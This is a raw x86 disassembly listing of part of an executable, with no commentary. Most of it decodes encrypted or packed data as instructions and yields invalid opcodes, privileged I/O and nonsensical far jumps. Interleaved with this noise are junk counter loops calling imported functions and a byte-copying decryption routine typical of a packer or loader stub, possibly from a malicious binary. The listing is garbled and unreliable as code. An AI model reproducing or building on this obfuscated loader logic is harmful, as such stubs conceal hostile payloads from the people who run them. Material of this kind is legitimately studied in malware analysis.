  40f25d:	scas   eax,DWORD PTR es:[edi]
  40f25e:	loope  0x40f1e8
  40f260:	mov    edx,0x164f85d9
  40f265:	sbb    ebp,DWORD PTR [edx+ebp*2-0x49]
  40f269:	mov    dh,BYTE PTR [esi-0xf5f26f1]
  40f26f:	jae    0x40f225
  40f271:	test   DWORD PTR [esi],0x8d6b3572
  40f277:	out    0x8d,eax
  40f279:	jns    0x40f215
  40f27b:	mov    al,0xc9
  40f27d:	loopne 0x40f2d9
  40f27f:	inc    ecx
  40f280:	ret    0x4f4a
  40f283:	dec    edx
  40f284:	outs   dx,BYTE PTR ds:[esi]
  40f285:	frstpm(287 only) 
  40f287:	mov    ?,WORD PTR [eax+edx*4-0x7f043564]
  40f28e:	xchg   ebx,eax
  40f28f:	imul   ebx,ebx,0x40
  40f292:	je     0x40f313
  40f294:	and    BYTE PTR [edx],dl
  40f296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f297:	mov    cl,0x5d
  40f299:	loopne 0x40f281
  40f29b:	mov    WORD PTR [ebp-0x63],ds
  40f29e:	out    0x5,al
  40f2a0:	jo     0x40f27c
  40f2a2:	retf   
  40f2a3:	je     0x40f261
  40f2a5:	test   eax,0x86ae10fc
  40f2aa:	mov    esp,0x477b74ec
  40f2af:	add    ah,dh
  40f2b1:	js     0x40f30d
  40f2b3:	leave  
  40f2b4:	(bad)  
  40f2b5:	hlt    
  40f2b6:	aaa    
  40f2b7:	mov    edx,0xd452b682
  40f2bc:	sbb    eax,ebp
  40f2be:	popa   
  40f2bf:	mov    dh,0x8d
  40f2c1:	test   DWORD PTR ds:0x6151a358,0x123bc08c
  40f2cb:	push   ss
  40f2cc:	test   eax,0xb514a8db
  40f2d1:	loopne 0x40f311
  40f2d3:	outs   dx,BYTE PTR ds:[esi]
  40f2d4:	je     0x40f2d8
  40f2d6:	rcl    ecx,0xbe
  40f2d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2da:	rcl    DWORD PTR [eax+0x6d],1
  40f2dd:	and    BYTE PTR [edi-0x79],ah
  40f2e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2e1:	scas   eax,DWORD PTR es:[edi]
  40f2e2:	fcmovb st,st(0)
  40f2e4:	not    BYTE PTR [edi+0x168cbabf]
  40f2ea:	adc    eax,ebx
  40f2ec:	(bad)  
  40f2ed:	cs sahf 
  40f2ef:	int    0xee
  40f2f1:	aaa    
  40f2f2:	adc    eax,0xfc0a63aa
  40f2f7:	inc    edi
  40f2f8:	frstor [esi]
  40f2fa:	mov    cl,al
  40f2fc:	pop    edi
  40f2fd:	xlat   BYTE PTR ds:[ebx]
  40f2fe:	inc    ecx
  40f2ff:	mov    bl,0xf5
  40f301:	sub    ecx,DWORD PTR [edi*8-0x6c711aac]
  40f308:	int    0x86
  40f30a:	dec    eax
  40f30b:	jecxz  0x40f323
  40f30d:	aad    0xf5
  40f30f:	jno    0x40f2c5
  40f311:	mov    WORD PTR ds:0x85f5b90c,es
  40f317:	(bad)  
  40f318:	arpl   WORD PTR [ebx+eiz*1],dx
  40f31b:	jb     0x40f371
  40f31d:	adc    ch,BYTE PTR [esi-0x797e1301]
  40f323:	jp     0x40f30e
  40f325:	and    al,0xd7
  40f327:	jle    0x40f358
  40f329:	add    eax,0x1c58a061
  40f32e:	xor    DWORD PTR [edi-0x45960efe],edx
  40f334:	fnstsw WORD PTR [ebp-0x3e6bbee4]
  40f33a:	jecxz  0x40f2d8
  40f33c:	mov    eax,0x24be9c91
  40f341:	cmp    dl,BYTE PTR [esi]
  40f343:	adc    eax,0xf26207f7
  40f348:	pop    eax
  40f349:	pusha  
  40f34a:	pop    esp
  40f34b:	jno    0x40f31c
  40f34d:	or     eax,0xa6576163
  40f352:	push   ebx
  40f353:	out    dx,al
  40f354:	xor    DWORD PTR [edi],esi
  40f356:	or     eax,0x69bc9972
  40f35b:	aas    
  40f35c:	mov    ch,0xdd
  40f35e:	sbb    BYTE PTR [ebx],dh
  40f360:	pshufw mm2,QWORD PTR [ebx+0x3bf64c4b],0x8f
  40f368:	xlat   BYTE PTR ds:[ebx]
  40f369:	xor    bl,ah
  40f36b:	add    dh,BYTE PTR [ebx+0x64]
  40f36e:	jns    0x40f3a0
  40f370:	xlat   BYTE PTR ds:[ebx]
  40f371:	xchg   ebx,eax
  40f372:	jae    0x40f376
  40f374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f375:	fisub  DWORD PTR [ebx]
  40f377:	mov    ?,WORD PTR [eax-0x1c786755]
  40f37d:	pop    ss
  40f37e:	inc    ebx
  40f37f:	xchg   edi,eax
  40f380:	clc    
  40f381:	sub    bh,BYTE PTR [eax-0x7637acf]
  40f387:	and    DWORD PTR ds:0x4338a7,0x0
  40f391:	xor    ecx,ecx
  40f393:	xor    ecx,DWORD PTR ds:0x4338a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4338a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4338a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4338a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4338a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4337ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433883
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4337d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4337d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4337d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4337d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4337d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43386f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43386f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43386f,ecx
  40f444:	cmp    DWORD PTR ds:0x43386f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43386f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43386f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43386f,ecx
  40f474:	cmp    DWORD PTR ds:0x43386f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43385b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43385b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43385b,edx
  40f498:	cmp    DWORD PTR ds:0x43385b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433a11
  40f4af:	push   0x433a67
  40f4b4:	push   0x433a4b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43385b,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433897
  40f4d2:	adc    DWORD PTR ds:0x4338a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x5484ccc7]
  40f540:	fs aam 0xac
  40f543:	jle    0x40f5c3
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	add    bh,BYTE PTR [ebx-0x1b]
  40f54c:	sahf   
  40f54d:	inc    ecx
  40f54e:	test   eax,0x11dfa3f0
  40f553:	inc    esp
  40f554:	and    al,0xc
  40f556:	jmp    0x5320:0xbbbe9a53
  40f55d:	fs stc 
  40f55f:	imul   esi,ebx,0x962f944f
  40f565:	outs   dx,BYTE PTR ds:[esi]
  40f566:	add    ecx,ebp
  40f568:	out    0xec,eax
  40f56a:	(bad)  
  40f56b:	lock add al,0xf6
  40f56e:	push   es
  40f56f:	std    
  40f570:	mov    bl,0x9c
  40f572:	adc    al,0x98
  40f574:	ins    DWORD PTR es:[edi],dx
  40f575:	sbb    al,0x15
  40f577:	pop    es
  40f578:	sub    eax,0x58632e26
  40f57d:	cs or  bh,bl
  40f580:	push   ds
  40f581:	push   ds
  40f582:	inc    ebx
  40f583:	xor    edx,DWORD PTR [edx]
  40f585:	shr    DWORD PTR [ebp+0x6b],0x99
  40f589:	(bad)  
  40f58a:	shl    DWORD PTR [ebp-0x5f5b49b2],cl
  40f590:	xchg   esi,ecx
  40f592:	jne    0x40f592
  40f594:	out    0x8b,eax
  40f596:	adc    eax,0xd880d5d8
  40f59b:	(bad)  [eax]
  40f59d:	in     eax,0xc0
  40f59f:	push   esi
  40f5a0:	cmp    eax,0x8754f589
  40f5a5:	sti    
  40f5a6:	mov    ds:0xf4169af9,al
  40f5ab:	jmp    0x55e7c2d5
  40f5b0:	jae    0x40f55b
  40f5b2:	push   0x22
  40f5b4:	sbb    al,0xe9
  40f5b6:	in     eax,dx
  40f5b7:	pop    ds
  40f5b8:	mov    edi,0x2b221d4e
  40f5bd:	pusha  
  40f5be:	xchg   edx,eax
  40f5bf:	addr16 jnp 0x40f565
  40f5c2:	or     ecx,DWORD PTR [ebp+0x2b]
  40f5c5:	fstp   TBYTE PTR [ebx+0xa]
  40f5c8:	push   eax
  40f5c9:	test   eax,0x8baa2126
  40f5ce:	frstor [ecx]
  40f5d0:	rcl    esi,cl
  40f5d2:	push   ebp
  40f5d3:	jb     0x40f5e9
  40f5d5:	into   
  40f5d6:	xor    DWORD PTR [ecx-0xb411fa4],esp
  40f5dc:	shl    bl,cl
  40f5de:	sar    DWORD PTR [esi-0x69],0x86
  40f5e2:	mov    DWORD PTR [edx+0x3cf3ffea],esi
  40f5e8:	mov    ebx,esi
  40f5ea:	fimul  DWORD PTR ds:0xefb0caa5
  40f5f0:	sub    dh,0x59
  40f5f3:	push   es
  40f5f4:	outs   dx,BYTE PTR ds:[esi]
  40f5f5:	or     eax,0xbcfee087
  40f5fa:	xchg   ebx,eax
  40f5fb:	mov    dh,0x73
  40f5fd:	adc    eax,0xf6ab68c0
  40f602:	xor    esi,DWORD PTR [edx]
  40f604:	(bad)  
  40f605:	ss mov edx,0x252d3ff5
  40f60b:	inc    ebp
  40f60c:	and    DWORD PTR [eax+0x4c],ebx
  40f60f:	xor    eax,0xf563d92a
  40f614:	adc    eax,0xa65aaef1
  40f619:	cmp    DWORD PTR [ebx],esi
  40f61b:	mov    dl,0x4a
  40f61d:	pop    ecx
  40f61e:	add    DWORD PTR [edi+0xd],edi
  40f621:	ja     0x40f647
  40f623:	cs push esi
  40f625:	dec    edx
  40f626:	in     al,dx
  40f627:	or     al,0x33
  40f629:	jno    0x40f5d5
  40f62b:	jp     0x40f6a8
  40f62d:	mov    ebp,0x13a5696b
  40f632:	mov    ebp,0xbff66fee
  40f637:	xor    edi,eax
  40f639:	sbb    BYTE PTR [ecx*4-0x4de519a0],cl
  40f640:	jnp    0x40f65f
  40f642:	test   DWORD PTR [edx-0x52],ecx
  40f645:	sub    bl,cl
  40f647:	call   0x5abcfd30
  40f64c:	cli    
  40f64d:	dec    ebx
  40f64e:	jp     0x40f653
  40f650:	mov    eax,0x5cdeeb2a
  40f655:	mov    eax,0x1ddcda21
  40f65a:	js     0x40f6b5
  40f65c:	inc    edi
  40f65d:	fistp  WORD PTR [edx+0x40]
  40f660:	mov    bh,0x99
  40f662:	sbb    eax,0xb61f1955
  40f667:	arpl   sp,bx
  40f669:	jge    0x40f65d
  40f66b:	outs   dx,DWORD PTR ds:[esi]
  40f66c:	ret    0x2dfc
  40f66f:	enter  0x188d,0x4
  40f673:	mov    dh,0x64
  40f675:	pop    esi
  40f676:	mov    ecx,0xb5e27d08
  40f67b:	cmp    al,0x38
  40f67d:	mov    WORD PTR [esi],fs
  40f67f:	shl    DWORD PTR [ebx],1
  40f681:	add    al,0x9d
  40f683:	mov    dl,BYTE PTR [ebp+0x2415954f]
  40f689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f68a:	in     al,0xc1
  40f68c:	iret   
  40f68d:	adc    ebx,DWORD PTR [ecx+0x55]
  40f690:	mov    BYTE PTR [ecx],bl
  40f692:	jge    0x40f6ab
  40f694:	mov    edi,0x1fe81379
  40f699:	mov    al,ds:0xcfee4984
  40f69e:	pop    es
  40f69f:	mov    ds:0xb43a0a96,eax
  40f6a4:	fwait
  40f6a5:	push   ss
  40f6a6:	ss iret 
  40f6a8:	jo     0x40f6d7
  40f6aa:	dec    esi
  40f6ab:	dec    edi
  40f6ac:	scas   eax,DWORD PTR es:[edi]
  40f6ad:	add    BYTE PTR [edx+eiz*2+0x9],bh
  40f6b1:	mov    cl,0x43
  40f6b3:	cmp    eax,0x8179ab39
  40f6b8:	xor    ecx,DWORD PTR [ebx-0xa779d57]
  40f6be:	imul   edi,ecx,0x9
  40f6c1:	dec    ecx
  40f6c2:	pop    edi
  40f6c3:	retf   0x1571
  40f6c6:	mov    cl,0xed
  40f6c8:	xchg   ebx,eax
  40f6c9:	je     0x40f72a
  40f6cb:	xchg   esi,eax
  40f6cc:	lahf   
  40f6cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6ce:	dec    ebp
  40f6cf:	inc    edx
  40f6d0:	push   ebp
  40f6d1:	mov    esp,0x863b637f
  40f6d6:	arpl   WORD PTR [eax],ax
  40f6d8:	adc    bh,BYTE PTR [eax+0x1c95e481]
  40f6de:	cmp    eax,0xe6b6efd4
  40f6e3:	mov    esp,0xe136a022
  40f6e8:	aas    
  40f6e9:	std    
  40f6ea:	cmp    BYTE PTR [esi+ebx*2-0x38],al
  40f6ee:	push   eax
  40f6ef:	mov    ds:0xceda5016,al
  40f6f4:	iret   
  40f6f5:	jnp    0x40f737
  40f6f7:	mov    ebx,0x27058eec
  40f6fc:	or     al,0xcd
  40f6fe:	into   
  40f6ff:	mov    BYTE PTR [edx-0x2edfc84],dh
  40f705:	rol    DWORD PTR [esp+eax*4],cl
  40f708:	setg   BYTE PTR [ebx-0x7cebdffa]
  40f70f:	hlt    
  40f710:	xchg   esp,eax
  40f711:	cwde   
  40f712:	mov    eax,ds:0x4ca86847
  40f717:	and    ch,BYTE PTR [edi+edi*1]
  40f71a:	jg     0x40f704
  40f71c:	pop    eax
  40f71d:	inc    eax
  40f71e:	xchg   esi,eax
  40f71f:	(bad)  
  40f720:	push   eax
  40f721:	(bad)  
  40f722:	stos   DWORD PTR es:[edi],eax
  40f723:	mov    ds:0xf127230c,al
  40f728:	xchg   edx,eax
  40f729:	adc    BYTE PTR [ebx-0x75],bh
  40f72c:	sbb    al,0x32
  40f72e:	mov    ecx,0xa65cd5b
  40f733:	lods   al,BYTE PTR ds:[esi]
  40f734:	pushf  
  40f735:	cmp    BYTE PTR [ebx-0x3371cc9b],bl
  40f73b:	add    al,0x1e
  40f73d:	push   ecx
  40f73e:	cmp    BYTE PTR [edx+0x1],ah
  40f741:	mov    al,ds:0x45860f6
  40f746:	shl    edi,1
  40f748:	stos   DWORD PTR es:[edi],eax
  40f749:	pop    ss
  40f74a:	and    esi,DWORD PTR [edi-0x12]
  40f74d:	mov    dh,0xed
  40f74f:	ror    DWORD PTR [esi+0x6b],1
  40f752:	push   esp
  40f753:	inc    ecx
  40f754:	ss or  eax,0xa8f14793
  40f75a:	push   esp
  40f75b:	dec    eax
  40f75c:	cmp    cl,dh
  40f75e:	hlt    
  40f75f:	mov    ebp,esi
  40f761:	test   al,0x2
  40f763:	cmp    ebp,ecx
  40f765:	es scas al,BYTE PTR es:[edi]
  40f767:	hlt    
  40f768:	sub    al,0xce
  40f76a:	retf   
  40f76b:	dec    ebx
  40f76c:	pop    esp
  40f76d:	(bad)  [edx-0x64]
  40f770:	push   es
  40f771:	xor    al,0xf4
  40f773:	int    0x7b
  40f775:	add    eax,edi
  40f777:	pop    esi
  40f778:	int3   
  40f779:	add    al,0x52
  40f77b:	in     eax,0x30
  40f77d:	pop    ebp
  40f77e:	xchg   esp,eax
  40f77f:	out    0x85,eax
  40f781:	mov    ds:0xff358314,al
  40f786:	sbb    al,0x3e
  40f788:	mov    al,ds:0xf4434fbe
  40f78d:	and    eax,0xa1272b6d
  40f792:	push   edx
  40f793:	(bad)  
  40f794:	sub    dl,BYTE PTR [esi]
  40f796:	out    dx,al
  40f797:	scas   eax,DWORD PTR es:[edi]
  40f798:	(bad)  
  40f79a:	add    BYTE PTR [esi],al
  40f79c:	pop    edi
  40f79d:	jmp    0x40f808
  40f79f:	sbb    DWORD PTR [esi],0x3b
  40f7a2:	sbb    bh,BYTE PTR [esi-0x15616a7d]
  40f7a8:	adc    cl,ah
  40f7aa:	and    ebx,DWORD PTR [ebp+0x2]
  40f7ad:	push   edx
  40f7ae:	dec    esp
  40f7af:	push   ecx
  40f7b0:	fldpi  
  40f7b2:	nop
  40f7b3:	sahf   
  40f7b4:	inc    ebx
  40f7b5:	mov    bl,0x41
  40f7b7:	and    edx,0x8eb6aded
  40f7bd:	sahf   
  40f7be:	mov    esi,DWORD PTR [ebp+0x2c]
  40f7c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7c2:	push   0x5a5c13b
  40f7c7:	add    al,0xe9
  40f7c9:	lahf   
  40f7ca:	fwait
  40f7cb:	or     al,0x55
  40f7cd:	pushf  
  40f7ce:	and    BYTE PTR [ecx-0x24],dl
  40f7d1:	mov    DWORD PTR [ebp+0x56],ecx
  40f7d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7d5:	jmp    0x2f2829dc
  40f7da:	pop    ds
  40f7db:	jle    0x40f7fe
  40f7dd:	bound  edi,QWORD PTR [esi-0x55]
  40f7e0:	bound  esp,QWORD PTR [edi]
  40f7e2:	jl     0x40f766
  40f7e4:	shr    DWORD PTR [edx+edi*2-0x40],1
  40f7e8:	(bad)  
  40f7e9:	jmp    0xe19b:0x7d5ef250
  40f7f0:	and    eax,0x19333159
  40f7f5:	jnp    0x40f7f1
  40f7f7:	out    dx,al
  40f7f8:	adc    DWORD PTR ds:0xe5fe389e,esp
  40f7fe:	leave  
  40f7ff:	int    0xc1
  40f801:	jb     0x40f78b
  40f803:	test   eax,0x602bf3b6
  40f808:	enter  0xd168,0x46
  40f80c:	rcl    bl,1
  40f80e:	js     0x40f7da
  40f810:	pop    es
  40f811:	sub    BYTE PTR [ecx],ah
  40f813:	cmc    
  40f814:	mov    dh,0xf2
  40f816:	jmp    0x732d:0xf94dc259
  40f81d:	jno    0x40f82b
  40f81f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f820:	into   
  40f821:	mov    ds:0xec42c36b,eax
  40f826:	sbb    BYTE PTR [ebx],0xe5
  40f829:	loope  0x40f85c
  40f82b:	mov    esp,0xfafbfb29
  40f830:	nop    DWORD PTR [edi]
  40f833:	pop    esi
  40f834:	and    bh,BYTE PTR [ecx-0x47]
  40f837:	pusha  
  40f838:	aaa    
  40f839:	out    0xa3,eax
  40f83b:	rcr    DWORD PTR ds:0x9ccc28bd,0x3e
  40f842:	push   cs
  40f843:	fcom   DWORD PTR [edx+0x7]
  40f846:	mov    ah,BYTE PTR [edi+0x332f0633]
  40f84c:	stc    
  40f84d:	add    edi,esi
  40f84f:	mov    esi,DWORD PTR [ebp+0x8]
  40f852:	imul   edi,edx
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0xdfa5f93f
  40f897:	cmp    al,0xd2
  40f899:	stos   DWORD PTR es:[edi],eax
  40f89a:	jle    0x40f91a
  40f89c:	jl     0x40f91b
  40f89e:	jle    0x40f91e
  40f8a0:	test   ebx,edx
  40f8a2:	ds push eax
  40f8a4:	mov    bl,0x7f
  40f8a6:	xlat   BYTE PTR ds:[ebx]
  40f8a7:	(bad)  
  40f8a8:	outs   dx,BYTE PTR ds:[esi]
  40f8a9:	jne    0x40f871
  40f8ab:	in     al,dx
  40f8ac:	ror    BYTE PTR [edx-0x13b3e4a2],1
  40f8b2:	push   0x907da09f
  40f8b7:	adc    eax,0xf5ce5c0
  40f8bc:	jns    0x40f8ed
  40f8be:	je     0x40f868
  40f8c0:	jo     0x40f8b2
  40f8c2:	push   cs
  40f8c3:	jmp    0xc219:0x9ca8447d
  40f8ca:	jb     0x40f93a
  40f8cc:	arpl   WORD PTR [esi+0x61],cx
  40f8cf:	xor    cl,bl
  40f8d1:	aam    0x5f
  40f8d3:	push   esi
  40f8d4:	jle    0x40f873
  40f8d6:	cmp    al,0x3d
  40f8d8:	jmp    0xb1a2:0xc3985d12
  40f8df:	aam    0xc9
  40f8e1:	gs (bad) 
  40f8e3:	sbb    eax,0x9eac802
  40f8e8:	dec    esp
  40f8e9:	imul   eax,DWORD PTR [esi],0x3caf3d56
  40f8ef:	aam    0x7
  40f8f1:	pop    eax
  40f8f2:	mov    edx,DWORD PTR [esi-0xa1b7fb4]
  40f8f8:	pop    esi
  40f8f9:	add    eax,0xa5fcd4b2
  40f8fe:	loope  0x40f94a
  40f900:	jno    0x40f90a
  40f902:	daa    
  40f903:	fstp   QWORD PTR [ecx+esi*4+0x61944960]
  40f90a:	scas   eax,DWORD PTR es:[edi]
  40f90b:	pushf  
  40f90c:	test   BYTE PTR [eax-0x4b2a3fd5],0x91
  40f913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f914:	sbb    BYTE PTR [eax-0x14],dh
  40f917:	lock jnp 0x40f8d3
  40f91a:	neg    BYTE PTR [eax+0x1bca4fad]
  40f920:	push   ebp
  40f921:	mov    ds:0xe4f320ff,eax
  40f926:	mov    ?,WORD PTR [ebx]
  40f928:	jnp    0x40f923
  40f92a:	rcl    BYTE PTR [eax+ecx*4-0x74],1
  40f92e:	lods   eax,DWORD PTR ds:[esi]
  40f92f:	sub    ecx,DWORD PTR [ebx+ecx*2+0x20]
  40f933:	cwde   
  40f934:	into   
  40f935:	fstp   TBYTE PTR [esi-0x76]
  40f938:	or     BYTE PTR [esi+ebx*8+0x7b],dl
  40f93c:	retf   
  40f93d:	aas    
  40f93e:	ja     0x40f8da
  40f940:	in     eax,0x89
  40f942:	push   cs
  40f943:	and    DWORD PTR [ebp+0x598c92f5],edi
  40f949:	(bad)  
  40f94a:	dec    ecx
  40f94b:	leave  
  40f94c:	xchg   esi,eax
  40f94d:	mov    bh,0x55
  40f94f:	jo     0x40f912
  40f951:	sub    dl,BYTE PTR [ebp+0x67afa6c5]
  40f957:	pop    eax
  40f958:	ss pop ebp
  40f95a:	stc    
  40f95b:	mov    dl,0xd9
  40f95d:	js     0x40f982
  40f95f:	inc    ebp
  40f960:	or     DWORD PTR [ecx],ecx
  40f962:	ror    BYTE PTR [edx],1
  40f964:	push   edi
  40f965:	adc    al,bh
  40f967:	cmp    BYTE PTR ds:0xf8ee540f,0x54
  40f96e:	dec    eax
  40f96f:	ss sbb al,0xa2
  40f972:	popa   
  40f973:	xor    dh,BYTE PTR [ebx]
  40f975:	scas   eax,DWORD PTR es:[edi]
  40f976:	repnz scas al,BYTE PTR es:[edi]
  40f978:	lea    esi,[edi]
  40f97a:	sub    DWORD PTR [eax-0x7f604af6],0xaa5d063f
  40f984:	inc    ebp
  40f985:	mov    ebx,0x19ba2321
  40f98a:	mov    ebp,0x10fb1fe6
  40f98f:	icebp  
  40f990:	mov    ecx,0xc590e5d8
  40f995:	jle    0x40f98e
  40f997:	jne    0x40f9fc
  40f999:	std    
  40f99a:	mov    dh,0xf6
  40f99c:	test   al,0x10
  40f99e:	aaa    
  40f99f:	cmc    
  40f9a0:	(bad)  
  40f9a1:	lahf   
  40f9a2:	aam    0x6b
  40f9a4:	or     DWORD PTR [ecx],esp
  40f9a6:	nop
  40f9a7:	loope  0x40f9f6
  40f9a9:	test   al,0x64
  40f9ab:	ins    BYTE PTR es:[edi],dx
  40f9ac:	mov    ecx,ebx
  40f9ae:	sbb    ebx,DWORD PTR [edi]
  40f9b0:	dec    esi
  40f9b1:	repz sti 
  40f9b3:	push   eax
  40f9b4:	repnz push ebp
  40f9b6:	inc    ecx
  40f9b7:	inc    esi
  40f9b8:	add    BYTE PTR [ebp+0x6cba6c16],0xf6
  40f9bf:	scas   al,BYTE PTR es:[edi]
  40f9c0:	sub    BYTE PTR [edx],al
  40f9c2:	aam    0xc5
  40f9c4:	push   cs
  40f9c5:	lea    ecx,[edx]
  40f9c7:	jns    0x40f9f5
  40f9c9:	xchg   esi,eax
  40f9ca:	adc    eax,0xf347c836
  40f9cf:	test   BYTE PTR [eax],al
  40f9d1:	jno    0x40f981
  40f9d3:	sbb    ecx,ebx
  40f9d5:	inc    eax
  40f9d6:	ror    BYTE PTR [esi],1
  40f9d8:	mov    ss,WORD PTR [ebx+0x6d]
  40f9db:	jnp    0x40f9e3
  40f9dd:	je     0x40f9fd
  40f9df:	mov    al,0xe8
  40f9e1:	add    eax,0x1dd81e3c
  40f9e6:	xor    BYTE PTR ss:[edx+0x64],bl
  40f9ea:	jmp    0x5994:0x6d6e428f
  40f9f1:	sbb    BYTE PTR [edx],dl
  40f9f3:	push   ss
  40f9f4:	adc    DWORD PTR [ebx],esi
  40f9f6:	inc    ebp
  40f9f7:	push   0xafe0cf2
  40f9fc:	adc    edx,DWORD PTR [ebp+0x15]
  40f9ff:	cmp    bh,bh
  40fa01:	push   esi
  40fa02:	clc    
  40fa03:	fcomi  st,st(4)
  40fa05:	mov    edx,0x24ce6f8f
  40fa0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa0b:	lods   eax,DWORD PTR ds:[esi]
  40fa0c:	std    
  40fa0d:	repz xchg ebx,eax
  40fa0f:	or     al,BYTE PTR [ecx+0xb25fbf6]
  40fa15:	ins    BYTE PTR es:[edi],dx
  40fa16:	es push es
  40fa18:	je     0x40fa59
  40fa1a:	nop
  40fa1b:	retf   
  40fa1c:	ret    0x2344
  40fa1f:	in     eax,dx
  40fa20:	(bad)  
  40fa21:	fiadd  DWORD PTR [esi]
  40fa23:	and    al,0x9
  40fa25:	cmp    eax,0x734c3e87
  40fa2a:	mov    esp,0x512719ab
  40fa2f:	dec    ebx
  40fa30:	add    edi,DWORD PTR [edi+0x5a]
  40fa33:	xor    al,0xc5
  40fa35:	push   edi
  40fa36:	das    
  40fa37:	enter  0xebc1,0xb0
  40fa3b:	dec    ebp
  40fa3c:	dec    ecx
  40fa3d:	adc    eax,0xd7d6265e
  40fa42:	fadd   QWORD PTR [edi+ebp*8+0x2e5e9266]
  40fa49:	out    0x42,eax
  40fa4b:	outs   dx,BYTE PTR ds:[esi]
  40fa4c:	xchg   ecx,eax
  40fa4d:	push   eax
  40fa4e:	xchg   ebp,eax
  40fa4f:	daa    
  40fa50:	into   
  40fa51:	cmp    eax,0x5cac9494
  40fa56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa57:	jnp    0x40faba
  40fa59:	scas   eax,DWORD PTR es:[edi]
  40fa5a:	pop    ebp
  40fa5b:	mov    dh,0x76
  40fa5d:	cmp    eax,esp
  40fa5f:	push   edi
  40fa60:	gs push esi
  40fa62:	dec    edi
  40fa63:	mov    gs,WORD PTR [ebp-0x2d]
  40fa66:	add    edi,ecx
